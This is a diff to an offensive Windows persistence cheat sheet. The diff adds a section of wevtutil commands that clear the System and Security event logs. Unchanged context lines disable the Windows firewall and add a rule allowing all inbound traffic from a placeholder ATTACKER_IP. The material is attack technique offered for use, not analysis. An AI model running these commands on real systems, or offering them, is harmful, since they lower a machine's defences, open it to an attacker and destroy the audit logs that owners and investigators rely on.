@@ -8,6 +8,7 @@
     * [Antivirus Removal](#antivirus-removal)
     * [Disable Windows Defender](#disable-windows-defender)
     * [Disable Windows Firewall](#disable-windows-firewall)
+    * [Clear System and Security Logs](#clear-system-and-security-logs)
 * [Simple User](#simple-user)
     * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
@@ -85,6 +86,13 @@ NetSh Advfirewall set allprofiles state off
 
 # ip whitelisting
 New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+```
+
+### Clear System and Security Logs
+
+```powershell
+cmd.exe /c wevtutil.exe cl System
+cmd.exe /c wevtutil.exe cl Security
 ```
 
 ## Simple User
